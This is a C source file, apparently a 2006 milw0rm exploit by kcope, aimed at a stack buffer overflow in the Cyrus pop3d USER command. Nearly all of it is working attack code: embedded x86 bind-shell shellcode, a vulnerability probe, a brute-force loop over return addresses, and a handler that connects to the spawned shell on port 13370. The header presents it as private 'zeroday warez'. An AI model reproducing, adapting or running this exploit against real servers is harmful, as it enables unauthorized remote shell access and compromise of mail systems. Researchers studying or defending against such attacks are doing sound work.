/* zeroday warez
 * !!! PRIVATE - DONT DISTRIBUTE - PRIVATE !!!
 *********************************************
 * cyruspop3d.c - cyrus pop3d remote exploit by kcope
 * tested on cyrus-imapd-2.3.2,linux
 *
 * bug found 23 Apr 2006 by kcope
 *--------------------------------------------
 *
 * imapd/pop3d.c line 1830 :
 * char userbuf[MAX_MAILBOX_NAME+1], *p;
 * ...
 * if (!ulen) ulen = strlen(user);
 *   if (config_getswitch(IMAPOPT_POPSUBFOLDERS)) {
 *    memcpy(userbuf, user, ulen);
 *    userbuf[ulen] = '\0';
 * ...
 * popsubfolders has to be enabled
 *
 * thnx to blackzero revoguard wY! qobaiashi bogus alex
 * Love to Lisa :-)
 *********************************************
 * !!! PRIVATE - DONT DISTRIBUTE - PRIVATE !!!
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/time.h>
#include <unistd.h>
#include <netdb.h>
#include <errno.h>

#define POP3PORT 110
#define BINDPORT 13370

unsigned char shellcode[] =
"\x31\xdb\x53\x43\x53\x6a\x02\x6a\x66\x58\x99\x89\xe1\xcd\x80\x96"
"\x43\x52\x66\x68\x34\x3a\x66\x53\x89\xe1\x6a\x66\x58\x50\x51\x56"
"\x89\xe1\xcd\x80\xb0\x66\xd1\xe3\xcd\x80\x52\x52\x56\x43\x89\xe1"
"\xb0\x66\xcd\x80\x93\x6a\x02\x59\xb0\x3f\xcd\x80\x49\x79\xf9\xb0"
"\x0b\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53"
"\x89\xe1\xcd\x80";

int do_connect (char *remotehost, int port)
{
   static struct hostent *host;
   static struct sockaddr_in addr;
   static int done=0;
   int s;

   if (!inet_aton(remotehost, &addr.sin_addr) && (done != 1))
   {
       host = gethostbyname(remotehost);
       if (!host)
       {
           perror("gethostbyname() failed");
           return -1;
       }
       addr.sin_addr = *(struct in_addr*)host->h_addr;
   }

   s = socket(PF_INET, SOCK_STREAM, 0);
   if (s == -1)
   {
       close(s);
       perror("socket() failed");
       return -1;
   }

   addr.sin_port = htons(port);
   addr.sin_family = AF_INET;

   if (connect(s, (struct sockaddr*)&addr, sizeof(addr)) == -1)
   {
       close(s);
       if (port == POP3PORT) perror("connect() failed");
       return -1;
   }

   done=1;
   return s;
}

void do_exploit(int sock, unsigned int returnaddr)
{
   char nops[360];
   char nops2[100];
   char exploitbuffer[1024];
   char recvbuf[30];

   memset(&nops[0], '\0', sizeof(nops));
   memset(&nops[0], 'A', 352);
   memset(&nops2[0], '\0', sizeof(nops2));
   memset(&nops2[0], 'A', 90);

   while (1) {
       recv(sock, recvbuf, 1, 0);
       if ((recvbuf[0] == '\r') || (recvbuf[0] == '\n')) break;
   }

   sprintf(exploitbuffer, "USER %s%s%s\r\n", nops, shellcode, nops2);

   exploitbuffer[strlen(exploitbuffer)-1] = (returnaddr >> 24) & 0xff;
   exploitbuffer[strlen(exploitbuffer)-2] = (returnaddr >> 16) & 0xff;
   exploitbuffer[strlen(exploitbuffer)-3] = (returnaddr >> 8) & 0xff;
   exploitbuffer[strlen(exploitbuffer)-4] = (returnaddr) & 0xff;

   send(sock, exploitbuffer, strlen(exploitbuffer), 0);
   recv(sock, recvbuf, sizeof(recvbuf)-1, 0);
}

int do_checkvulnerable(int sock) {
   char checkbuffer[1024];
   char recvbuffer[10];

   memset(&checkbuffer[0], '\0', sizeof(checkbuffer)-1);
   memset(&checkbuffer[0], 'A', sizeof(checkbuffer)-2);
   checkbuffer[0]='U';
   checkbuffer[1]='S';
   checkbuffer[2]='E';
   checkbuffer[3]='R';
   checkbuffer[4]=' ';
   checkbuffer[sizeof(checkbuffer)-3]='\r';
   checkbuffer[sizeof(checkbuffer)-2]='\n';

   while (1) {
       recv(sock, recvbuffer, 1, 0);
       if ((recvbuffer[0] == '\r') || (recvbuffer[0] == '\n')) break;
   }

   send(sock, checkbuffer, strlen(checkbuffer), 0);

   if (recv(sock, recvbuffer, sizeof(recvbuffer)-1, MSG_WAITALL) < 3)
       return 0;

   return -1;
}

int do_remote_shell(int sockfd)
{
   while(1)
        {
           fd_set fds;
           FD_ZERO(&fds);
           FD_SET(0,&fds);
           FD_SET(sockfd,&fds);
           if(select(FD_SETSIZE,&fds,NULL,NULL,NULL))
           {
              int cnt;
              char buf[1024];
              if(FD_ISSET(0,&fds))
              {
                 if((cnt=read(0,buf,1024))<1)
                 {
                    if(errno==EWOULDBLOCK||errno==EAGAIN)
                      continue;
                    else
                      break;
                 }
                 write(sockfd,buf,cnt);
              }
              if(FD_ISSET(sockfd,&fds))
              {
                 if((cnt=read(sockfd,buf,1024))<1)
                 {
                      if(errno==EWOULDBLOCK||errno==EAGAIN)
                        continue;
                      else
                        break;
                 }
                 write(1,buf,cnt);
              }
           }
        }
}

int main(int argc, char **argv)
{
   char remotehost[255];
   int s,s2,i;
   unsigned int returnaddr;

   printf("cyrus pop3d remote exploit [kcope/2006]\n");

   if (argc < 3) {
       printf("usage: %s <remote host> <brute force start return address>\n", argv[0]);
       printf("eg: %s localhost bfffa000\n", argv[0]);
       return 1;
   }

   strcpy(remotehost, argv[1]); //uhoho
   if (sscanf(argv[2], "%8x", &returnaddr) == 0) {
       printf("Specify valid start return address\n");
       return 1;
   }

   printf("Checking if vulnerable... ");
   s=do_connect(remotehost, POP3PORT);
   if (do_checkvulnerable(s) == -1) {
       close(s);
       printf("\ncyrus pop3d seems not to be vulnerable\nno popsubfolders defined at remote host?\n");
       return 1;
   }
   close(s);
   printf("SUCCESS!\n");

   while (returnaddr < 0xbfffffff) {
       returnaddr+=16;

       printf("CRACKADDR = %4x\n", returnaddr);
       fflush(stdout);
       s=do_connect(remotehost, POP3PORT);
       if (s==-1)
           return 1;

       do_exploit(s, returnaddr);
       for (i=0;i<2;i++) {
           if ((s2=do_connect(remotehost, BINDPORT)) != -1) {
               printf("\nALEX,ALEX WE GOT IT!!!\n");
               do_remote_shell(s2);
               return 0;
           }
           close(s2);
       }

       close(s);
   }

   return 0;
}

// milw0rm.com [2006-05-21]